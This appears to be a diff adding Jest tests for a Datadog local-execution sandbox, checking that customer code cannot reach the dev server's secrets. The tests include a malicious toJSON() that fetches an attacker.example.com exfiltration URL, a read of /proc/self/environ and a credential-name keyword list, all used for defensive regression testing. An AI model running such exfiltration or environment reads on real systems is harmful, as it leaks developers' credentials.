@@ -5,12 +5,15 @@
 /* global globalThis, NodeJS */
 
 import type { Logger } from '@dd/core/types';
+import { installFakeProcessEnv } from '@dd/tests/_jest/helpers/env';
 import { mockLogFn, mockLogger, moduleResolverFor } from '@dd/tests/_jest/helpers/mocks';
+import fs from 'fs';
 
 import * as shared from '../backend/shared';
 import type { BackendFunction } from '../backend/types';
 import { LOCAL_EXECUTION_LOAD_SUFFIX } from '../constants';
 
+import { forceResetEnv } from './env-guard';
 import {
     func,
     makePreviewRuntimeContext,
@@ -75,9 +78,12 @@ function executeScriptLocally(
     );
 }
 
-// Same reasoning as network-guard.test.ts's own afterEach.
+// Same reasoning as network-guard.test.ts's own afterEach, plus process.env: it's also a
+// process-wide singleton, so a test that leaves it swapped would otherwise leak into every later
+// test in this Jest worker.
 afterEach(() => {
     forceReset();
+    forceResetEnv();
 });
 
 /** A `loadModule` double that resolves the customer's function from a map and rejects anything else with a module-not-found error, matching the common case where neither optional package is installed. */
@@ -180,6 +186,74 @@ describe('local-execution — executeScriptLocally', () => {
 
         expect(result).toEqual({ data: 'done' });
         expect(dollarDuringModuleLoad).toBeUndefined();
+    });
+
+    test("Should scope process.env during a customer module's own top-level evaluation, not expose the dev server's real environment", async () => {
+        process.env.DD_TEST_REAL_SECRET = 'sk_live_real_secret';
+        let secretDuringModuleLoad: unknown = 'not captured';
+        const loadModule: LoadModule = async (specifier) => {
+            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                secretDuringModuleLoad = process.env.DD_TEST_REAL_SECRET;
+                return { example: () => 'done' };
+            }
+            const notFoundError: NodeJS.ErrnoException = new Error(
+                `Cannot find module '${specifier}'`,
+            );
+            notFoundError.code = 'MODULE_NOT_FOUND';
+            throw notFoundError;
+        };
+
+        try {
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: 'done' });
+            expect(secretDuringModuleLoad).toBeUndefined();
+            expect(process.env.DD_TEST_REAL_SECRET).toBe('sk_live_real_secret');
+        } finally {
+            delete process.env.DD_TEST_REAL_SECRET;
+        }
+    });
+
+    test("Should install the fs environ guard before a customer module's own top-level evaluation runs, not just during the exported function's own body", async () => {
+        if (process.platform !== 'linux') {
+            return;
+        }
+
+        let threwDuringModuleLoad = false;
+        const loadModule: LoadModule = async (specifier) => {
+            if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                try {
+                    fs.readFileSync('/proc/self/environ');
+                } catch {
+                    threwDuringModuleLoad = true;
+                }
+                return { example: () => 'done' };
+            }
+            const notFoundError: NodeJS.ErrnoException = new Error(
+                `Cannot find module '${specifier}'`,
+            );
+            notFoundError.code = 'MODULE_NOT_FOUND';
+            throw notFoundError;
+        };
+
+        const result = await executeScriptLocally(
+            func,
+            TEST_PROJECT_ROOT,
+            [],
+            stubExecuteAction,
+            loadModule,
+            mockLogger,
+        );
+
+        expect(result).toEqual({ data: 'done' });
+        expect(threwDuringModuleLoad).toBe(true);
     });
 
     test("Should return a pre-existing globalThis.$ during a customer module's top-level evaluation when something (e.g. zx/globals) seeded it before this module loaded", async () => {
@@ -922,6 +996,156 @@ describe('local-execution — executeScriptLocally', () => {
         expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
     });
 
+    describe('env-guard integration', () => {
+        // Tests below spread process.env into an override object and assert on it; a failing
+        // assertion's Jest diff would otherwise serialize whatever process.env holds at that point,
+        // including this CI job's own real secrets. `originalEnv` is a small, fully-fake base
+        // instead of the real environment, so a failure here can only ever leak a placeholder.
+        const originalEnv: NodeJS.ProcessEnv = {
+            PATH: '/usr/bin',
+            HOME: '/home/dev',
+            NODE_ENV: 'development',
+            TMPDIR: '/tmp',
+        };
+
+        installFakeProcessEnv(originalEnv, { resetBetweenTests: true });
+
+        test("Should never expose the dev server's own DD_API_KEY to the customer function", async () => {
+            process.env = { ...originalEnv, DD_API_KEY: 'the-dev-servers-own-api-key' };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => typeof process.env.DD_API_KEY === 'undefined',
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: true });
+        });
+
+        test("Should never expose an AWS-like credential from the developer's own shell to the customer function", async () => {
+            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => typeof process.env.AWS_SECRET_ACCESS_KEY === 'undefined',
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: true });
+        });
+
+        test('Should still expose PATH/HOME/NODE_ENV/TMPDIR to the customer function when set in the real environment', async () => {
+            process.env = {
+                ...originalEnv,
+                PATH: '/usr/bin',
+                HOME: '/home/dev',
+                NODE_ENV: 'development',
+                TMPDIR: '/tmp',
+            };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({
+                    example: () => ({
+                        PATH: process.env.PATH,
+                        HOME: process.env.HOME,
+                        NODE_ENV: process.env.NODE_ENV,
+                        TMPDIR: process.env.TMPDIR,
+                    }),
+                }),
+                mockLogger,
+            );
+
+            expect(result).toEqual({
+                data: {
+                    PATH: '/usr/bin',
+                    HOME: '/home/dev',
+                    NODE_ENV: 'development',
+                    TMPDIR: '/tmp',
+                },
+            });
+        });
+
+        test('Should restore the real process.env after execution, whether the function resolves or throws', async () => {
+            process.env = { ...originalEnv, AWS_SECRET_ACCESS_KEY: 'super-secret-aws-key' };
+            const realEnvSnapshot = { ...process.env };
+
+            await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: () => 'ok' }),
+                mockLogger,
+            );
+            expect({ ...process.env }).toEqual(realEnvSnapshot);
+
+            await expect(
+                executeScriptLocally(
+                    func,
+                    TEST_PROJECT_ROOT,
+                    [],
+                    stubExecuteAction,
+                    loadModuleReturning({
+                        example: () => {
+                            throw new Error('boom');
+                        },
+                    }),
+                    mockLogger,
+                ),
+            ).rejects.toThrow('boom');
+            expect({ ...process.env }).toEqual(realEnvSnapshot);
+        });
+
+        // Regression coverage: the action-catalog/backend-runtime registrations resolve real npm
+        // package specifiers a customer project could itself declare — their own top-level code must
+        // never see the real, unscoped environment, the same guarantee already proven for the
+        // customer function itself above.
+        test("Should never expose the dev server's own DD_API_KEY to the action-catalog package's own load-time code", async () => {
+            process.env = { ...originalEnv, DD_API_KEY: 'the-dev-servers-own-api-key' };
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+
+            let envSeenDuringRegistration: string | undefined;
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return { example: () => 'ok' };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    envSeenDuringRegistration = process.env.DD_API_KEY;
+                    return { setExecuteActionImplementation: () => {} };
+                }
+                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
+                error.code = 'MODULE_NOT_FOUND';
+                throw error;
+            };
+
+            const result = await executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: 'ok' });
+            expect(envSeenDuringRegistration).toBeUndefined();
+        });
+    });
+
     test('Should preserve preview context fields while overriding invocation-owned args and Actions', async () => {
         const getRuntimeContext = async () => ({
             ...makePreviewRuntimeContext(),
@@ -956,7 +1180,7 @@ describe('local-execution — executeScriptLocally', () => {
         });
     });
 
-    test('Should never expose an auth token via globalThis, including nested inside $.Source', async () => {
+    test('Should never expose a credential-shaped field anywhere on $, not just inside $.Source', async () => {
         const result = await executeScriptLocally(
             func,
             TEST_PROJECT_ROOT,
@@ -964,18 +1188,33 @@ describe('local-execution — executeScriptLocally', () => {
             stubExecuteAction,
             loadModuleReturning({
                 example: () => {
-                    // Recurses into $.Source (a plain data object) but not $.Actions (a Proxy dispatch mechanism, not a data container we'd leak a token into).
-                    const containsTokenKey = (value: unknown): boolean =>
+                    const CREDENTIAL_SUBSTRINGS = [
+                        'token',
+                        'secret',
+                        'key',
+                        'password',
+                        'credential',
+                    ];
+                    const hasCredentialName = (key: string) =>
+                        CREDENTIAL_SUBSTRINGS.some((substring) =>
+                            key.toLowerCase().includes(substring),
+                        );
+                    // Recurses into every value, but never enumerates Actions itself (a Proxy dispatch
+                    // mechanism, not a data container) — the preview response backing the rest of $ is
+                    // validated only for Source's shape, so nothing else stops an unexpected field
+                    // (present now or added later) from reaching it undetected.
+                    const containsCredentialKey = (value: unknown): boolean =>
                         typeof value === 'object' &&
                         value !== null &&
                         Object.entries(value).some(
                             ([key, nested]) =>
-                                key.toLowerCase().includes('token') || containsTokenKey(nested),
+                                hasCredentialName(key) || containsCredentialKey(nested),
                         );
                     const dollar = testDollar();
+                    const { Actions: _actions, ...dollarWithoutActions } = dollar;
                     return (
-                        Object.keys(globalThis).some((k) => k.toLowerCase().includes('token')) ||
-                        containsTokenKey(dollar.Source)
+                        Object.keys(globalThis).some(hasCredentialName) ||
+                        containsCredentialKey(dollarWithoutActions)
                     );
                 },
             }),
@@ -1467,6 +1706,62 @@ describe('local-execution — executeScriptLocally', () => {
                 ),
             ).rejects.toThrow(/must have an inputs field/);
             expect(executeAction).not.toHaveBeenCalled();
+        });
+
+        // Mirrors the raw $.Actions path's malicious-toJSON() test — the action-catalog typed-wrapper path needed its own serialize-before-runAllowed fix since it doesn't share code with makeActionsProxy.
+        test("Should block a malicious toJSON() on an action-catalog typed-wrapper call's request from making a real network call under cover of the exemption", async () => {
+            jest.spyOn(shared, 'isActionCatalogInstalled').mockReturnValue(true);
+            let registeredImpl:
+                | ((actionId: string, request: unknown) => Promise<unknown>)
+                | undefined;
+            let fetchAttempt: Promise<unknown> | undefined;
+            const maliciousRequest = {
+                inputs: {
+                    text: 'hi',
+                    toJSON() {
+                        fetchAttempt = fetch('https://attacker.example.com/exfiltrate');
+                        return { text: 'hi' };
+                    },
+                },
+                connectionId: 'conn-1',
+            };
+
+            const loadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        example: async () =>
+                            registeredImpl?.(
+                                'com.datadoghq.slack.chat.postMessage',
+                                maliciousRequest,
+                            ),
+                    };
+                }
+                if (specifier === '@datadog/action-catalog/action-execution') {
+                    return {
+                        setExecuteActionImplementation: (
+                            impl: (actionId: string, request: unknown) => Promise<unknown>,
+                        ) => {
+                            registeredImpl = impl;
+                        },
+                    };
+                }
+                const error: NodeJS.ErrnoException = new Error(`Cannot find module '${specifier}'`);
+                error.code = 'MODULE_NOT_FOUND';
+                throw error;
+            };
+
+            const result = await executeScriptLocally(
+                funcWithConnection,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModule,
+                mockLogger,
+            );
+
+            expect(result).toEqual({ data: { data: null, stub: true, fqn: expect.any(String) } });
+            expect(fetchAttempt).toBeDefined();
+            await expect(fetchAttempt).rejects.toThrow(/Network access is not allowed/);
         });
 
         // Mirrors the action-catalog abandonment test — apps-backend's setBackend has the same shared-module-level-setter hazard.
@@ -2898,6 +3193,60 @@ describe('local-execution — executeScriptLocally', () => {
             );
 
             await expect(second).resolves.toEqual({ data: 'b-result' });
+        });
+
+        // Regression coverage: abandonBlockedScope() cleans up network-guard's own state when an
+        // execution is abandoned by timeout, but had no equivalent call into env-guard — a genuinely
+        // hung customer function (fn() never resolves, so runWithScopedEnv's own finally never
+        // fires) left activeScopeCount incremented and excludeEnv pinned forever, since nothing else
+        // ever forces it back.
+        test('Should reset env-guard shared state (activeScopeCount/excludeEnv) after an execution is abandoned by timeout', async () => {
+            const originalExcludeEnv = process.report.excludeEnv;
+
+            const hangingLoadModule: LoadModule = async (specifier: string) => {
+                if (specifier === func.absolutePath + LOCAL_EXECUTION_LOAD_SUFFIX) {
+                    return {
+                        // Never resolves — its own runWithScopedEnv call can never reach its finally.
+                        example: () => new Promise(() => {}),
+                    };
+                }
+                const notFoundError: NodeJS.ErrnoException = new Error(
+                    `Cannot find module '${specifier}'`,
+                );
+                notFoundError.code = 'MODULE_NOT_FOUND';
+                throw notFoundError;
+            };
+
+            const abandoned = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                hangingLoadModule,
+                mockLogger,
+                20,
+            );
+            await expect(abandoned).rejects.toThrow(/timed out after 20ms/);
+
+            // Without forceResetEnv() being called from abandonExecutionAndRejectWith, this would
+            // still read `true` (armed for the zombie's still-running scope) instead of whatever it
+            // was before this execution ever started.
+            expect(process.report.excludeEnv).toBe(originalExcludeEnv);
+
+            // A later, unrelated execution must still cycle activeScopeCount through a genuine
+            // 0→1→0 transition — if the zombie's count were still stuck above 0, this execution's
+            // own increment would land on 2 (not the 1 that arms/disarms excludeEnv), leaving it
+            // permanently desynced from this execution's own scope instead of following it.
+            const later = executeScriptLocally(
+                func,
+                TEST_PROJECT_ROOT,
+                [],
+                stubExecuteAction,
+                loadModuleReturning({ example: async () => 'ok' }),
+                mockLogger,
+            );
+            await expect(later).resolves.toEqual({ data: 'ok' });
+            expect(process.report.excludeEnv).toBe(originalExcludeEnv);
         });
     });
 });
